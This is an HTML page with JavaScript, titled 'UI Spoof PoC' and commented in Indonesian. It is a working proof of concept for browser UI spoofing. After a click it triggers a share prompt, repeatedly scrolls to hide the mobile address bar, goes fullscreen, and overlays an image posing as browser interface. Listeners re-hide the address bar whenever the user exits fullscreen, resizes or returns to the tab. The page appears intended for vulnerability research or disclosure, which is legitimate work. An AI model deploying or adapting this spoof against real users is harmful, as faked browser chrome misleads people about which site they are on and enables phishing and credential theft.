<!DOCTYPE html>
<html lang="en">
<head>
  <title>UI Spoof PoC</title>
  <meta charset="utf-8">
  <meta name="viewport"
        content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>

  <style>
    html, body {
      margin: 0;
      padding: 0;
      height: 300vh;
      background: #000;
      font-family: system-ui, sans-serif;
      overscroll-behavior: none;
    }

    #spoof {
      position: fixed;
      inset: 0;
      width: 100vw;
      height: 100vh;
      object-fit: contain;
      background: #000;
      display: none;
      z-index: 9999;
    }

    #content {
      position: fixed;
      inset: 0;
      display: flex;
      align-items: center;
      justify-content: center;
      color: white;
      text-align: center;
    }
  </style>
</head>

<body>

<img id="spoof" src="spof.png" alt="spoof-ui">

<div id="content">
  <h1>Click anywhere</h1>
</div>

<script>
let once = false;

function hideOmnibarHard() {
  let i = 0;
  function loop() {
    window.scrollTo(0, 1);
    if (++i < 40) requestAnimationFrame(loop);
  }
  loop();
}

onclick = async () => {
  if (once) return;
  once = true;

  // 1️⃣ SHARE (harus di user gesture)
  if (navigator.share) {
    try {
      await navigator.share({
        title: "Example",
        text: "Check this out",
        url: location.href
      });
    } catch (e) {
      // user cancel = normal
    }
  }

  // 2️⃣ hide omnibar
  hideOmnibarHard();

  // 3️⃣ spoof + fullscreen
  content.style.display = "none";
  spoof.style.display = "block";

  document.documentElement.requestFullscreen?.().catch(()=>{});
};

// keluar fullscreen
document.addEventListener("fullscreenchange", () => {
  if (!document.fullscreenElement) {
    setTimeout(hideOmnibarHard, 0);
    setTimeout(hideOmnibarHard, 100);
    setTimeout(hideOmnibarHard, 300);
    setTimeout(hideOmnibarHard, 600);
  }
});

// fallback
window.addEventListener("resize", hideOmnibarHard);
window.addEventListener("orientationchange", hideOmnibarHard);
document.addEventListener("visibilitychange", () => {
  if (!document.hidden) hideOmnibarHard();
});
</script>

</body>
</html>
